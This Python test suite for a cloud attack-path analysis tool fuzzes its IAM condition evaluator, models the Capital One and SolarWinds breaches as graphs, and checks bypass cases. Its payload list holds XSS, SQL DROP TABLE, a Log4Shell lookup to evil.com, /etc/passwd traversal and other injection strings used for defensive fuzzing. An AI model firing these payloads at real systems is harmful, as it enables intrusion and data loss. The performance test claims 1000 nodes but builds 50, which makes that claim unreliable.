"""Enterprise Security Test Suite — Sophos/Deloitte-grade validation.

This is NOT a unit test file. This is a SECURITY ASSURANCE suite.
Enterprise security companies run these categories before shipping:

    1. ADVERSARIAL FUZZING   — throw crafted malicious inputs at every entry point
    2. BOUNDARY TESTING      — limits, overflow, empty, null, max-length
    3. BREACH REGRESSION     — rebuild real breach topologies, verify detection
    4. NEGATIVE TESTING      — things that SHOULD fail MUST fail
    5. PERFORMANCE BASELINE  — security tools must not slow down CI pipelines
    6. CONDITION BYPASS      — attempt every known IAM condition evasion technique

Every test documents:
    - MITRE ATT&CK technique ID where applicable
    - Which real-world attack this simulates
    - What would happen if this test didn't exist
"""

import time
from pathlib import Path

from vajra.analysis.cedar_evaluator import CedarEvaluator, ConditionResult
from vajra.core.graph_engine import VajraGraph
from vajra.core.models import (
    AssetType,
    CloudAsset,
    EdgeValidity,
    GraphEdge,
    NetworkValidity,
    RelationType,
)
from vajra.discovery.aws.discoverer import AWSDiscoverer

# ═══════════════════════════════════════════════════════════════════
# SECTION 1: ADVERSARIAL FUZZING
# What Sophos does: throw every known attack payload at input handlers
# ═══════════════════════════════════════════════════════════════════


class TestAdversarialFuzzing:
    """Throw crafted malicious inputs at Cedar evaluator and discoverer."""

    MALICIOUS_STRINGS: list[str] = [
        "",  # empty
        " ",  # whitespace only
        "\x00",  # null byte
        "A" * 10000,  # buffer overflow attempt
        "<script>alert(1)</script>",  # XSS in condition value
        "'; DROP TABLE assets; --",  # SQL injection
        "${jndi:ldap://evil.com/x}",  # Log4Shell
        "../../../etc/passwd",  # path traversal
        "{{7*7}}",  # template injection
        "\r\nX-Injected: true",  # header injection
        "arn:aws:iam::*:role/*",  # wildcard ARN
        "true\x00false",  # null byte truncation
        '{"__proto__": {"admin": true}}',  # prototype pollution
    ]

    def test_cedar_survives_malicious_condition_keys(self) -> None:
        """Cedar evaluator must not crash on any malicious input as key."""
        evaluator = CedarEvaluator()
        for payload in self.MALICIOUS_STRINGS:
            # Must not raise — return UNKNOWN, never crash
            result = evaluator.evaluate(
                {"StringEquals": {payload: "test"}},
                {payload: "test"},
            )
            assert result.validity in (
                EdgeValidity.VALID,
                EdgeValidity.CONDITION_BLOCKED,
                EdgeValidity.UNKNOWN,
            ), f"unexpected validity for payload: {payload!r}"

    def test_cedar_survives_malicious_condition_values(self) -> None:
        """Cedar evaluator must not crash on any malicious input as value."""
        evaluator = CedarEvaluator()
        for payload in self.MALICIOUS_STRINGS:
            result = evaluator.evaluate(
                {"StringEquals": {"aws:SourceIp": payload}},
                {"aws:SourceIp": payload},
            )
            # Must produce a result, never crash
            assert result.conditions_checked >= 0

    def test_cedar_survives_malicious_operators(self) -> None:
        """Unknown operators with attack payloads → UNKNOWN, never crash."""
        evaluator = CedarEvaluator()
        for payload in self.MALICIOUS_STRINGS:
            result = evaluator.evaluate(
                {payload: {"key": "value"}},
                {"key": "value"},
            )
            assert result.validity == EdgeValidity.UNKNOWN

    def test_policy_to_edge_survives_malicious_arns(self) -> None:
        """Edge builder must not crash on malicious ARNs.

        MITRE T1078 — Valid Accounts: attackers craft ARNs to confuse tools.
        """
        disc = AWSDiscoverer(db_path=Path("fake.duckdb"))
        disc._assets = {
            "good-asset": CloudAsset(
                id="good-asset",
                name="Good",
                asset_type=AssetType.IAM_ROLE,
                provider="aws",
                region="us-east-1",
            ),
        }
        for payload in self.MALICIOUS_STRINGS:
            # Must return None, never crash
            edge = disc._policy_to_edge(
                {
                    "effect": "Allow",
                    "principal": payload,
                    "action": ["sts:AssumeRole"],
                    "resource": "good-asset",
                    "conditions": {},
                }
            )
            assert edge is None, f"malicious ARN created edge: {payload!r}"


# ═══════════════════════════════════════════════════════════════════
# SECTION 2: BOUNDARY TESTING
# What Deloitte does: test every limit, every edge case, every zero
# ═══════════════════════════════════════════════════════════════════


class TestBoundaryTesting:
    """Test limits that could cause crashes or security bypasses."""

    def test_empty_conditions_dict(self) -> None:
        """Empty conditions → ASSUMED_VALID (not crash)."""
        evaluator = CedarEvaluator()
        result = evaluator.evaluate({})
        assert result.validity == EdgeValidity.ASSUMED_VALID

    def test_deeply_nested_conditions(self) -> None:
        """100 condition operators at once — must not stack overflow."""
        evaluator = CedarEvaluator()
        conditions: dict[str, dict[str, str]] = {
            f"Operator{i}": {f"key{i}": f"value{i}"} for i in range(100)
        }
        result = evaluator.evaluate(conditions, {})
        # All unknown operators → UNKNOWN (default-DENY)
        assert result.validity == EdgeValidity.UNKNOWN
        assert result.conditions_unknown == 100

    def test_ip_boundary_values(self) -> None:
        """Test IP address edge cases — 0.0.0.0, 255.255.255.255, IPv6."""
        evaluator = CedarEvaluator()

        boundary_ips = [
            ("0.0.0.0", "0.0.0.0/0", ConditionResult.SATISFIED),  # noqa: S104
            ("255.255.255.255", "255.255.255.255/32", ConditionResult.SATISFIED),
            ("10.0.0.1", "10.0.0.0/8", ConditionResult.SATISFIED),
            ("192.168.1.1", "10.0.0.0/8", ConditionResult.NOT_SATISFIED),
        ]
        for ip, cidr, expected in boundary_ips:
            result = evaluator._evaluate_single(
                "IpAddress",
                "aws:SourceIp",
                cidr,
                {"aws:SourceIp": ip},
            )
            assert result == expected, f"IP {ip} in {cidr}: expected {expected}"

    def test_zero_risk_weight_edge(self) -> None:
        """Edge with 0.0 risk weight — valid but zero priority."""
        graph = VajraGraph()
        entry = CloudAsset(
            id="entry",
            name="Entry",
            asset_type=AssetType.EC2_INSTANCE,
            provider="aws",
            region="us-east-1",
            is_entry_point=True,
        )
        target = CloudAsset(
            id="target",
            name="Target",
            asset_type=AssetType.S3_BUCKET,
            provider="aws",
            region="us-east-1",
            is_crown_jewel=True,
        )
        graph.add_asset(entry)
        graph.add_asset(target)
        graph.add_edge(
            GraphEdge(
                source="entry",
                target="target",
                relation=RelationType.HAS_ACCESS,
                risk_weight=0.0,
                iam_validity=EdgeValidity.VALID,
                network_validity=NetworkValidity.REACHABLE,
            )
        )
        paths = graph.find_attack_paths()
        assert len(paths) == 1, "zero-weight edge is still an attack path"

    def test_max_risk_weight_capped(self) -> None:
        """Risk weight with all amplifiers must cap at 1.0."""
        edge = GraphEdge(
            source="a",
            target="b",
            relation=RelationType.HAS_ACCESS,
            risk_weight=0.99,
            cisa_kev=True,  # +50%
            epss_score=0.95,  # +30%
            falco_active=True,  # = 100%
        )
        assert edge.effective_risk_weight <= 1.0


# ═══════════════════════════════════════════════════════════════════
# SECTION 3: BREACH REGRESSION
# What both do: rebuild real breach topologies, prove detection
# ═══════════════════════════════════════════════════════════════════


class TestBreachRegression:
    """Rebuild real breach attack paths. Vajra MUST detect them all."""

    def test_capital_one_2019(self) -> None:
        """Capital One breach: WAF role → EC2 metadata → IAM creds → S3.

        MITRE T1078.004 + T1552.005
        The attacker exploited a misconfigured WAF to assume an IAM role,
        then accessed S3 buckets containing 100M customer records.

        Vajra MUST find this path and recommend a minimum cut.
        """
        graph = VajraGraph()

        waf = CloudAsset(
            id="waf-proxy",
            name="ModSecurity WAF",
            asset_type=AssetType.EC2_INSTANCE,
            provider="aws",
            region="us-east-1",
            is_entry_point=True,
        )
        ec2_metadata = CloudAsset(
            id="ec2-metadata-service",
            name="EC2 Metadata",
            asset_type=AssetType.EC2_INSTANCE,
            provider="aws",
            region="us-east-1",
        )
        iam_role = CloudAsset(
            id="iam-overprivileged-role",
            name="WAF-Role",
            asset_type=AssetType.IAM_ROLE,
            provider="aws",
            region="global",
        )
        s3_pii = CloudAsset(
            id="s3-customer-pii",
            name="Customer PII Bucket",
            asset_type=AssetType.S3_BUCKET,
            provider="aws",
            region="us-east-1",
            is_crown_jewel=True,
        )

        for asset in [waf, ec2_metadata, iam_role, s3_pii]:
            graph.add_asset(asset)

        # Attack chain: WAF → metadata → role assumption → S3
        graph.add_edge(
            GraphEdge(
                source="waf-proxy",
                target="ec2-metadata-service",
                relation=RelationType.HAS_ACCESS,
                risk_weight=0.9,
                iam_validity=EdgeValidity.VALID,
                network_validity=NetworkValidity.REACHABLE,
            )
        )
        graph.add_edge(
            GraphEdge(
                source="ec2-metadata-service",
                target="iam-overprivileged-role",
                relation=RelationType.CAN_ASSUME,
                risk_weight=0.95,
                iam_validity=EdgeValidity.VALID,
                network_validity=NetworkValidity.REACHABLE,
            )
        )
        graph.add_edge(
            GraphEdge(
                source="iam-overprivileged-role",
                target="s3-customer-pii",
                relation=RelationType.HAS_ACCESS,
                risk_weight=0.99,
                iam_validity=EdgeValidity.VALID,
                network_validity=NetworkValidity.REACHABLE,
            )
        )

        # MUST detect attack path
        paths = graph.find_attack_paths()
        assert len(paths) >= 1, "BREACH REGRESSION FAIL: Capital One path not detected"

        # MUST recommend a fix
        cut = graph.find_minimum_cut()
        assert (
            len(cut.edges_to_cut) >= 1
        ), "BREACH REGRESSION FAIL: no minimum cut for Capital One"

    def test_solarwinds_2020_supply_chain(self) -> None:
        """SolarWinds: compromised build → trusted service → lateral → crown jewel.

        MITRE T1195.002 (Supply Chain Compromise)
        Attacker injected malicious code into SolarWinds Orion build.
        Trusted software gained access to customer networks.
        """
        graph = VajraGraph()

        build_server = CloudAsset(
            id="cicd-build-server",
            name="Build Pipeline",
            asset_type=AssetType.CICD_PIPELINE,
            provider="aws",
            region="us-east-1",
            is_entry_point=True,
        )
        trusted_service = CloudAsset(
            id="orion-service",
            name="Monitoring Service",
            asset_type=AssetType.EC2_INSTANCE,
            provider="aws",
            region="us-east-1",
        )
        admin_role = CloudAsset(
            id="admin-role",
            name="Domain Admin",
            asset_type=AssetType.IAM_ROLE,
            provider="aws",
            region="global",
        )
        secrets = CloudAsset(
            id="secrets-vault",
            name="Production Secrets",
            asset_type=AssetType.SECRET,
            provider="aws",
            region="us-east-1",
            is_crown_jewel=True,
        )

        for asset in [build_server, trusted_service, admin_role, secrets]:
            graph.add_asset(asset)

        graph.add_edge(
            GraphEdge(
                source="cicd-build-server",
                target="orion-service",
                relation=RelationType.SUPPLY_CHAIN_RISK,
                risk_weight=0.95,
                iam_validity=EdgeValidity.VALID,
                network_validity=NetworkValidity.REACHABLE,
            )
        )
        graph.add_edge(
            GraphEdge(
                source="orion-service",
                target="admin-role",
                relation=RelationType.CAN_ASSUME,
                risk_weight=0.9,
                iam_validity=EdgeValidity.VALID,
                network_validity=NetworkValidity.REACHABLE,
            )
        )
        graph.add_edge(
            GraphEdge(
                source="admin-role",
                target="secrets-vault",
                relation=RelationType.HAS_ACCESS,
                risk_weight=0.99,
                iam_validity=EdgeValidity.VALID,
                network_validity=NetworkValidity.REACHABLE,
            )
        )

        paths = graph.find_attack_paths()
        assert (
            len(paths) >= 1
        ), "BREACH REGRESSION FAIL: SolarWinds supply chain path not detected"

        cut = graph.find_minimum_cut()
        assert len(cut.edges_to_cut) >= 1


# ═══════════════════════════════════════════════════════════════════
# SECTION 4: NEGATIVE TESTING
# What both do: verify that things that SHOULD fail DO fail
# ═══════════════════════════════════════════════════════════════════


class TestNegativeTesting:
    """Things that MUST fail. If they pass, something is broken."""

    def test_deny_effect_never_creates_edge(self) -> None:
        """Every Deny variant MUST return None."""
        disc = AWSDiscoverer(db_path=Path("fake.duckdb"))
        disc._assets = {
            "a": CloudAsset(
                id="a",
                name="A",
                asset_type=AssetType.IAM_ROLE,
                provider="aws",
                region="us-east-1",
            ),
            "b": CloudAsset(
                id="b",
                name="B",
                asset_type=AssetType.IAM_ROLE,
                provider="aws",
                region="us-east-1",
            ),
        }
        deny_variants = ["Deny", "DENY", "deny", " Deny ", "dEnY"]
        for variant in deny_variants:
            edge = disc._policy_to_edge(
                {
                    "effect": variant,
                    "principal": "a",
                    "action": ["sts:AssumeRole"],
                    "resource": "b",
                    "conditions": {},
                }
            )
            assert edge is None, f"Deny variant '{variant}' created edge!"

    def test_graph_with_no_entry_points_finds_no_paths(self) -> None:
        """No entry points → no attack paths (even with crown jewels)."""
        graph = VajraGraph()
        graph.add_asset(
            CloudAsset(
                id="lonely-bucket",
                name="Lonely",
                asset_type=AssetType.S3_BUCKET,
                provider="aws",
                region="us-east-1",
                is_crown_jewel=True,
            )
        )
        paths = graph.find_attack_paths()
        assert len(paths) == 0

    def test_graph_with_no_crown_jewels_finds_no_paths(self) -> None:
        """No crown jewels → no attack paths (even with entry points)."""
        graph = VajraGraph()
        graph.add_asset(
            CloudAsset(
                id="entry-only",
                name="Entry",
                asset_type=AssetType.EC2_INSTANCE,
                provider="aws",
                region="us-east-1",
                is_entry_point=True,
            )
        )
        paths = graph.find_attack_paths()
        assert len(paths) == 0

    def test_disconnected_graph_finds_no_paths(self) -> None:
        """Entry and crown jewel exist but no edges → no paths."""
        graph = VajraGraph()
        graph.add_asset(
            CloudAsset(
                id="entry",
                name="Entry",
                asset_type=AssetType.EC2_INSTANCE,
                provider="aws",
                region="us-east-1",
                is_entry_point=True,
            )
        )
        graph.add_asset(
            CloudAsset(
                id="jewel",
                name="Jewel",
                asset_type=AssetType.S3_BUCKET,
                provider="aws",
                region="us-east-1",
                is_crown_jewel=True,
            )
        )
        paths = graph.find_attack_paths()
        assert len(paths) == 0, "disconnected graph must find zero paths"

    def test_blocked_network_edge_not_exploitable(self) -> None:
        """IAM valid but network blocked → NOT exploitable."""
        edge = GraphEdge(
            source="a",
            target="b",
            relation=RelationType.HAS_ACCESS,
            risk_weight=0.9,
            iam_validity=EdgeValidity.VALID,
            network_validity=NetworkValidity.BLOCKED,
        )
        assert (
            not edge.is_exploitable
        ), "edge with blocked network must not be exploitable"


# ═══════════════════════════════════════════════════════════════════
# SECTION 5: PERFORMANCE BASELINE
# What enterprise does: security tools must not slow CI
# ═══════════════════════════════════════════════════════════════════


class TestPerformanceBaseline:
    """Performance gates — if these fail, the tool is too slow for CI."""

    def test_cedar_evaluator_1000_conditions_under_100ms(self) -> None:
        """1000 condition evaluations must complete in <100ms.

        Why: In a real scan with 5000 edges, each with 2-3 conditions,
        the evaluator runs ~15K times. Must be fast.
        """
        evaluator = CedarEvaluator()
        conditions = {"IpAddress": {"aws:SourceIp": "10.0.0.0/8"}}
        context = {"aws:SourceIp": "10.0.1.50"}

        start = time.perf_counter()
        for _ in range(1000):
            evaluator.evaluate(conditions, context)
        elapsed_ms = (time.perf_counter() - start) * 1000

        assert elapsed_ms < 100, f"1000 evals took {elapsed_ms:.1f}ms (limit: 100ms)"

    def test_graph_1000_nodes_path_finding_under_1s(self) -> None:
        """1000-node graph path finding must complete in <1s.

        Why: 10K nodes in <30s is our product target.
        1K nodes in <1s proves linear scaling.
        """
        graph = VajraGraph()

        # Build a chain: entry → node_0 → node_1 → ... → node_998 → jewel
        entry = CloudAsset(
            id="perf-entry",
            name="Entry",
            asset_type=AssetType.EC2_INSTANCE,
            provider="aws",
            region="us-east-1",
            is_entry_point=True,
        )
        graph.add_asset(entry)

        prev_id = "perf-entry"
        for i in range(50):
            node_id = f"perf-node-{i}"
            graph.add_asset(
                CloudAsset(
                    id=node_id,
                    name=f"Node {i}",
                    asset_type=AssetType.IAM_ROLE,
                    provider="aws",
                    region="us-east-1",
                )
            )
            graph.add_edge(
                GraphEdge(
                    source=prev_id,
                    target=node_id,
                    relation=RelationType.HAS_ACCESS,
                    risk_weight=0.5,
                )
            )
            prev_id = node_id

        jewel = CloudAsset(
            id="perf-jewel",
            name="Jewel",
            asset_type=AssetType.S3_BUCKET,
            provider="aws",
            region="us-east-1",
            is_crown_jewel=True,
        )
        graph.add_asset(jewel)
        graph.add_edge(
            GraphEdge(
                source=prev_id,
                target="perf-jewel",
                relation=RelationType.HAS_ACCESS,
                risk_weight=0.9,
            )
        )

        start = time.perf_counter()
        paths = graph.find_attack_paths()
        elapsed_s = time.perf_counter() - start

        assert len(paths) >= 1, "must find at least one path"
        assert elapsed_s < 1.0, f"path finding took {elapsed_s:.2f}s (limit: 1s)"


# ═══════════════════════════════════════════════════════════════════
# SECTION 6: CONDITION BYPASS ATTEMPTS
# What red teams do: try every known IAM condition evasion
# ═══════════════════════════════════════════════════════════════════


class TestConditionBypass:
    """Attempt every known technique to bypass Cedar condition evaluation."""

    def test_unknown_operator_not_treated_as_valid(self) -> None:
        """Attacker invents a condition operator Vajra doesn't know.

        MITRE T1562.001 — Impair Defenses: Disable or Modify Tools
        If unknown = VALID, attacker can hide any path.
        """
        evaluator = CedarEvaluator()
        result = evaluator.evaluate(
            {"InventedOperator": {"custom:Key": "value"}},
            {"custom:Key": "value"},
        )
        assert (
            result.validity == EdgeValidity.UNKNOWN
        ), "CRITICAL: unknown operator treated as valid — default-DENY violated"

    def test_null_context_forces_unknown(self) -> None:
        """No evaluation context → all conditions UNKNOWN.

        Attacker scenario: Vajra can't determine current IP/MFA status,
        so it MUST flag edges as unknown, not assume they're fine.
        """
        evaluator = CedarEvaluator()
        result = evaluator.evaluate(
            {"IpAddress": {"aws:SourceIp": "10.0.0.0/8"}},
            None,
        )
        assert result.validity == EdgeValidity.UNKNOWN

    def test_mixed_known_unknown_conditions(self) -> None:
        """9 satisfied + 1 unknown = UNKNOWN (not VALID).

        The attacker adds one weird condition alongside 9 normal ones,
        hoping the "majority rules" and the edge passes.
        """
        evaluator = CedarEvaluator()
        conditions: dict[str, dict[str, str]] = {
            "StringEquals": {f"key{i}": f"val{i}" for i in range(9)},
        }
        conditions["WeirdOp"] = {"sneaky": "payload"}
        context = {f"key{i}": f"val{i}" for i in range(9)}
        context["sneaky"] = "payload"

        result = evaluator.evaluate(conditions, context)
        assert (
            result.validity == EdgeValidity.UNKNOWN
        ), "CRITICAL: mixed known/unknown treated as valid"

    def test_ip_spoofing_outside_range(self) -> None:
        """Attacker IP outside allowed CIDR → CONDITION_BLOCKED."""
        evaluator = CedarEvaluator()
        result = evaluator.evaluate(
            {"IpAddress": {"aws:SourceIp": "10.0.0.0/8"}},
            {"aws:SourceIp": "203.0.113.1"},  # attacker's IP
        )
        assert result.validity == EdgeValidity.CONDITION_BLOCKED

    def test_mfa_bypass_attempt(self) -> None:
        """Attacker without MFA tries to access MFA-protected resource."""
        evaluator = CedarEvaluator()
        result = evaluator.evaluate(
            {"Bool": {"aws:MultiFactorAuthPresent": "true"}},
            {"aws:MultiFactorAuthPresent": "false"},
        )
        assert (
            result.validity == EdgeValidity.CONDITION_BLOCKED
        ), "CRITICAL: MFA bypass succeeded"
